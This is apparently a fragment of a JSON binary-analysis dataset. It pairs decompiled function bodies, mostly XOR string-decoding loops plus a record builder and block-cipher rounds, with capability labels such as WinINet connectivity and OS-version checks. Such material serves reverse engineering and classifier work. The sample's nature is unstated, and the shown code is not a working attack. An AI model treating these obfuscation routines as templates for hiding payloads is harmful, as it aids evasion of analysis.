        "decompiled_code": "\nvoid fcn.00028648(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x6493f != '\\0') {\n        puVar1 = 0x64900;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f70);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "000286a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000286a0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x649bf != '\\0') {\n        puVar1 = 0x64980;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f70);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 167
    },
    "000286f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000286f8(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64a3f != '\\0') {\n        puVar1 = 0x64a00;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f70);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "00028750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028750(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64abf != '\\0') {\n        puVar1 = 0x64a80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64a80, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "000287a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000287a0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64b3f != '\\0') {\n        puVar1 = 0x64b00;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64b00, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "000287f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000287f0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64abf != '\\0') {\n        puVar1 = 0x64a80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x1195c);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 173
    },
    "00028848": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028848(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64b3f != '\\0') {\n        puVar1 = 0x64b00;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061a0e(arg1, arg2, 0x1195c);\n    *(arg1 + (arg2 - 1) * 2) = 0;\n    return;\n}\n",
        "token_count": 173
    },
    "000288a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000288a0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64abf != '\\0') {\n        puVar1 = 0x64a80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11ec0);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "000288f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000288f8(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64bbf != '\\0') {\n        puVar1 = 0x64b80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b1c(arg1, arg2, 0x11f70);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "00028950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028950(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (str.cz_[0] != '\\0') {\n        puVar1 = 0x64c00;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64c00, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 168
    },
    "000289a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000289a0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64cbf != '\\0') {\n        puVar1 = 0x64c80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64c80, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "000289f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000289f0(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64d3f != '\\0') {\n        puVar1 = 0x64d00;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64d00, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "00028a40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00028a40(int64_t arg1, ulong arg2)\n\n{\n    uint8_t *puVar1;\n    int64_t iVar2;\n    \n    if (*0x64dbf != '\\0') {\n        puVar1 = 0x64d80;\n        iVar2 = 0x40;\n        do {\n            *puVar1 = *puVar1 ^ puVar1[-0x40];\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00061b0a(arg1, 0x64d80, arg2);\n    *((arg2 - 1) + arg1) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "00029124": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00029124(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    ulong arg4_00;\n    uint32_t auStackX8 [8];\n    char *in_stack_00000028;\n    uint32_t uStack392;\n    uint32_t uStack388;\n    uint32_t uStack384;\n    int32_t iStack376;\n    int32_t iStack372;\n    int32_t iStack368;\n    int32_t iStack364;\n    ulong uStack328;\n    ulong uStack320;\n    uchar auStack296 [272];\n    \n    auStackX8[0] = arg1;\n    fcn.0002f23c(0x7a528);\n    iVar2 = fcn.00021828(0xfffffffe, 8, auStackX8, &uStack392);\n    if (iVar2 == 0) {\n        if (((arg3 != 1) || (iStack372 != 1)) ||\n           ((iStack376 != arg2 && (((iStack376 != 0 && (iStack364 != arg2)) && (iStack364 != 0)))))) {\n            uVar4 = 0x21590064;\n            goto code_r0x000293b8;\n        }\n        iVar2 = fcn.000266fc(uStack384, uStack388, in_stack_00000028, 0x104);\n        if (iVar2 != 0) {\ncode_r0x00029242:\n            uVar4 = iVar2 + 0x191U | 0x21590000;\n            goto code_r0x000293b8;\n        }\n        iStack368 = iStack368 + 1;\n        iVar2 = fcn.000219dc(uStack392, uStack384, uStack388, 2);\n        if (iVar2 != 0) goto code_r0x00029242;\n        if (arg2 != 0) {\n            if (iStack376 == 0) {\n                arg4_00 = 0;\n                iStack376 = arg2;\n            }\n            else {\n                if (iStack364 != 0) goto code_r0x000293b6;\n                arg4_00 = 3;\n                iStack364 = arg2;\n            }\n            iVar2 = fcn.000219dc(uStack392, uStack384, uStack388, arg4_00);\n            if (iVar2 != 0) goto code_r0x00029242;\n        }\ncode_r0x000293b6:\n        uVar4 = 0;\n    }\n    else {\n        if (*0x64078 == 0) {\n            iVar2 = fcn.00030554(0x104, auStack296);\n            if (iVar2 != 0) goto code_r0x000292a6;\ncode_r0x0002927c:\n            uVar4 = fcn.0002fde4();\n            goto code_r0x000293b8;\n        }\n        if (arg3 == 1) {\n            fcn.000283e0(auStack296, 0x104);\n        }\n        else {\n            fcn.00028388(auStack296, 0x104);\n        }\ncode_r0x000292a6:\n        if (arg4 == 0) {\n            iVar2 = fcn.000303e4(auStack296, 0x11f90, 0, in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x0002927c;\n        }\n        else {\n            fcn.0001fd08(in_stack_00000028, 0x104, 0x11f88, auStack296);\n        }\n        iVar3 = -1;\n        pcVar5 = in_stack_00000028;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uStack328 = CONCAT44(arg3, arg2);\n        uStack320 = 1;\n        iVar2 = fcn.000268d0(8, auStackX8[0], in_stack_00000028, ~iVar3);\n        if (iVar2 == 0) {\n            if ((arg3 & 1) == 0) goto code_r0x000293b6;\n            uVar4 = fcn.00028a90(auStackX8[0], in_stack_00000028);\n            if (uVar4 == 0) goto code_r0x000293b8;\n            iVar2 = fcn.00021828(0xfffffffe, 8, auStackX8, &uStack392);\n            if (iVar2 == 0) {\n                fcn.0002191c(uStack392, uStack384, uStack388);\n            }\n        }\n        else {\n            uVar4 = iVar2 + 0x191U | 0x21590000;\n        }\n        fcn.00030a28(in_stack_00000028);\n    }\ncode_r0x000293b8:\n    fcn.0002f2a4(0x7a528);\n    return uVar4;\n}\n",
        "token_count": 1198
    },
    "0002ae80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002ae80(uint32_t *arg1, ulong *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int32_t *piVar9;\n    uint32_t *puVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    uint32_t uStackX8;\n    uint32_t uStackX32;\n    uint64_t uVar17;\n    \n    uVar8 = 0;\n    uVar17 = uVar8;\n    if (arg1[4] != 0) {\n        uVar14 = arg1[4];\n        uVar13 = uVar8;\n        do {\n            if (*arg1 != 0) {\n                uVar15 = *arg1;\n                piVar9 = *(uVar13 + *(arg1 + 6));\n                piVar6 = *(arg1 + 2) + 4;\n                do {\n                    if (*piVar6 == 200) {\n                        uVar16 = uVar17 + 4 + *piVar9 * 2;\n                    }\n                    else {\n                        uVar16 = uVar17 + 4 + *piVar9;\n                    }\n                    uVar17 = uVar16;\n                    piVar6 = piVar6 + 2;\n                    piVar9 = piVar9 + 6;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            uVar13 = uVar13 + 8;\n            uVar14 = uVar14 - 1;\n        } while (uVar14 != 0);\n    }\n    puVar4 = fcn.0002fbc4(*arg1 * 0x11 + 0x14 + uVar17);\n    if (puVar4 == NULL) {\n        uVar5 = 0x21590004;\n    }\n    else {\n        *puVar4 = 0;\n        puVar4[1] = 0;\n        *(puVar4 + 2) = 0;\n        *puVar4 = *arg1;\n        *(puVar4 + 4) = arg1[4];\n        uVar2 = fcn.0002fcf4(*puVar4);\n        *puVar4 = uVar2;\n        uVar2 = fcn.0002fcf4(*(puVar4 + 4));\n        puVar10 = puVar4 + 0x14;\n        *(puVar4 + 4) = uVar2;\n        fcn.00061a56(puVar10, 0);\n        uVar13 = uVar8;\n        uVar14 = uVar8;\n        if (*arg1 != 0) {\n            do {\n                *puVar10 = *(*(arg1 + 2) + uVar13);\n                cVar1 = *(*(arg1 + 2) + 4 + uVar13);\n                *(puVar10 + 1) = cVar1;\n                if ((cVar1 == -0x38) || (cVar1 == -0x37)) {\n                    *(puVar10 + 1) = 4;\n                }\n                uVar16 = fcn.0002fcf4(*puVar10);\n                uVar18 = uVar14 + 1;\n                *puVar10 = uVar16;\n                puVar10 = puVar10 + 0x11;\n                uVar13 = uVar13 + 8;\n                uVar14 = uVar18;\n            } while (uVar18 < *arg1);\n        }\n        uVar16 = *arg1;\n        uStackX32 = 0;\n        uVar14 = uVar16 * 0x11 + 0x14;\n        uVar13 = uVar8;\n        if (arg1[4] != 0) {\n            do {\n                uVar7 = 0;\n                uStackX8 = 0;\n                uVar15 = uVar7;\n                uVar19 = uVar7;\n                uVar18 = uVar8;\n                if (uVar16 != 0) {\n                    do {\n                        iVar12 = uVar14;\n                        if (*(uVar19 + 4 + *(arg1 + 2)) == 200) {\n                            iVar11 = *(uVar13 + *(arg1 + 6));\n                            if ((*(iVar11 + uVar15) == 0) || (iVar11 = *(iVar11 + 8 + uVar15),  iVar11 == 0)) {\n                                *(uVar14 + puVar4) = 0;\n                                uVar16 = iVar12 + 4;\n                                uStackX8 = uVar7;\n                            }\n                            else {\n                                iVar3 = fcn.00031810(iVar11);\n                                uVar2 = fcn.0002fcf4(iVar3 * 2);\n                                *(uVar14 + puVar4) = uVar2;\n                                fcn.00031740(*(*(uVar13 + *(arg1 + 6)) + 8 + uVar15), iVar12 + 4U + puVar4, \n                                             0xffffffffffffffff);\n                                uVar16 = iVar12 + 4U + iVar3 * 2;\n                            }\n                        }\n                        else {\n                            uVar2 = fcn.0002fcf4(*(*(uVar13 + *(arg1 + 6)) + uVar15));\n                            *(uVar14 + puVar4) = uVar2;\n                            iVar11 = iVar12 + 4U + puVar4;\n                            fcn.000619f6(iVar11, *(*(uVar13 + *(arg1 + 6)) + 8 + uVar15));\n                            fcn.0001fa8c(*(uVar19 + 4 + *(arg1 + 2)), iVar11, *(*(uVar13 + *(arg1 + 6)) + uVar15));\n                            uVar16 = iVar12 + 4U + *(*(uVar13 + *(arg1 + 6)) + uVar15);\n                        }\n                        uVar14 = uVar16;\n                        uVar16 = *arg1;\n                        uStackX8 = uStackX8 + 1;\n                        uVar7 = uStackX8;\n                        uVar15 = uVar15 + 0x18;\n                        uVar19 = uVar19 + 8;\n                        uVar18 = uStackX32;\n                    } while (uStackX8 < uVar16);\n                }\n                uStackX32 = uVar18 + 1;\n                uVar8 = uStackX32;\n                uVar13 = uVar13 + 8;\n            } while (uStackX32 < arg1[4]);\n        }\n        *arg2 = puVar4;\n        *arg3 = *arg1 * 0x11 + 0x14 + uVar17;\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 1601
    },
    "0002b22c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002b22c(uint32_t *arg1, int32_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = arg1[1] + *arg2;\n    uVar1 = arg2[1] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) + *((uVar3 >> 0x10) * 4 + 0x12c60)) -\n            *((uVar3 >> 0x18) * 4 + 0x12860) ^ *arg1;\n    uVar3 = arg2[2] ^ uVar4;\n    uVar1 = arg2[3] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = arg1[1] ^ (*((uVar3 >> 8) * 4 + 0x12060) - *((uVar3 & 0xff) * 4 + 0x12460)) +\n                      *((uVar3 >> 0x18) * 4 + 0x12860) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = arg2[4] - uVar2;\n    uVar1 = arg2[5] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x12060) + *((uVar3 & 0xff) * 4 + 0x12460) ^ *((uVar3 >> 0x18) * 4 + 0x12860))\n                    - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = uVar4 + arg2[6];\n    uVar1 = arg2[7] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12c60)) - *((uVar3 >> 0x18) * 4 + 0x12860);\n    uVar3 = arg2[8] ^ uVar2;\n    uVar1 = arg2[9] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x12060) - *((uVar3 & 0xff) * 4 + 0x12460)) + *((uVar3 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = arg2[10] - uVar4;\n    uVar1 = arg2[0xb] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x12060) + *((uVar3 & 0xff) * 4 + 0x12460) ^ *((uVar3 >> 0x18) * 4 + 0x12860))\n                    - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = uVar2 + arg2[0xc];\n    uVar1 = arg2[0xd] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12c60)) - *((uVar3 >> 0x18) * 4 + 0x12860);\n    uVar3 = arg2[0xe] ^ uVar4;\n    uVar1 = arg2[0xf] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x12060) - *((uVar3 & 0xff) * 4 + 0x12460)) + *((uVar3 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = arg2[0x10] - uVar2;\n    uVar1 = arg2[0x11] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x12060) + *((uVar3 & 0xff) * 4 + 0x12460) ^ *((uVar3 >> 0x18) * 4 + 0x12860))\n                    - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar3 = uVar4 + arg2[0x12];\n    uVar1 = arg2[0x13] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12c60)) - *((uVar3 >> 0x18) * 4 + 0x12860);\n    uVar3 = arg2[0x14] ^ uVar2;\n    uVar1 = arg2[0x15] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x12060) - *((uVar3 & 0xff) * 4 + 0x12460)) + *((uVar3 >> 0x18) * 4 + 0x12860)\n                    ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    uVar1 = arg2[0x17] & 0x1f;\n    uVar3 = arg2[0x16] - uVar4 << uVar1 | arg2[0x16] - uVar4 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x12060) + *((uVar3 & 0xff) * 4 + 0x12460) ^ *((uVar3 >> 0x18) * 4 + 0x12860))\n                    - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n    if (arg2[0x20] == 0) {\n        uVar1 = arg2[0x19] & 0x1f;\n        uVar3 = uVar2 + arg2[0x18] << uVar1 | uVar2 + arg2[0x18] >> 0x20 - uVar1;\n        uVar4 = uVar4 ^ ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) +\n                        *((uVar3 >> 0x10) * 4 + 0x12c60)) - *((uVar3 >> 0x18) * 4 + 0x12860);\n        uVar3 = arg2[0x1a] ^ uVar4;\n        uVar1 = arg2[0x1b] & 0x1f;\n        uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n        uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x12060) - *((uVar3 & 0xff) * 4 + 0x12460)) +\n                        *((uVar3 >> 0x18) * 4 + 0x12860) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n        uVar3 = arg2[0x1c] - uVar2;\n        uVar1 = arg2[0x1d] & 0x1f;\n        uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n        uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x12060) + *((uVar3 & 0xff) * 4 + 0x12460) ^\n                        *((uVar3 >> 0x18) * 4 + 0x12860)) - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12c60);\n        uVar1 = arg2[0x1f] & 0x1f;\n        uVar3 = uVar4 + arg2[0x1e] << uVar1 | uVar4 + arg2[0x1e] >> 0x20 - uVar1;\n        uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x12060) ^ *((uVar3 & 0xff) * 4 + 0x12460)) +\n                        *((uVar3 >> 0x10) * 4 + 0x12c60)) - *((uVar3 >> 0x18) * 4 + 0x12860);\n    }\n    arg1[1] = uVar4;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 2570
    },
    "0002b72c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002b72c(uint32_t *arg1, int32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    \n    uVar8 = *arg1;\n    uVar6 = arg1[1];\n    if (arg2[0x20] == 0) {\n        uVar4 = arg2[0x1f] & 0x1f;\n        uVar7 = uVar6 + arg2[0x1e] << uVar4 | uVar6 + arg2[0x1e] >> 0x20 - uVar4;\n        uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x12060) ^ *((uVar7 & 0xff) * 4 + 0x12460)) +\n                        *((uVar7 >> 0x10) * 4 + 0x12c60)) - *((uVar7 >> 0x18) * 4 + 0x12860);\n        uVar7 = arg2[0x1c] - uVar8;\n        uVar4 = arg2[0x1d] & 0x1f;\n        uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n        uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x12060) + *((uVar7 & 0xff) * 4 + 0x12460) ^\n                        *((uVar7 >> 0x18) * 4 + 0x12860)) - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n        uVar7 = arg2[0x1a] ^ uVar6;\n        uVar4 = arg2[0x1b] & 0x1f;\n        uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n        uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x12060) - *((uVar7 & 0xff) * 4 + 0x12460)) +\n                        *((uVar7 >> 0x18) * 4 + 0x12860) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12c60);\n        uVar4 = arg2[0x19] & 0x1f;\n        uVar7 = uVar8 + arg2[0x18] << uVar4 | uVar8 + arg2[0x18] >> 0x20 - uVar4;\n        uVar6 = uVar6 ^ ((*((uVar7 >> 8) * 4 + 0x12060) ^ *((uVar7 & 0xff) * 4 + 0x12460)) +\n                        *((uVar7 >> 0x10) * 4 + 0x12c60)) - *((uVar7 >> 0x18) * 4 + 0x12860);\n    }\n    uVar4 = arg2[0x17] & 0x1f;\n    uVar7 = arg2[0x16] - uVar6 << uVar4 | arg2[0x16] - 